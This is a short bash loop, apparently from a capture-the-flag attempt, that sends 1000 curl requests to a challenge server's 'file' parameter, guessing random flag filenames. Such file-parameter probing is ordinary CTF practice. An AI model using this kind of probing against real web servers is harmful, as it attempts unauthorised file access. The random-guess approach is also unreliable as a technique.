for i in {1..1000}; do
  curl "http://journal.chal.imaginaryctf.org/?file=/flag-$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 20).txt"
done
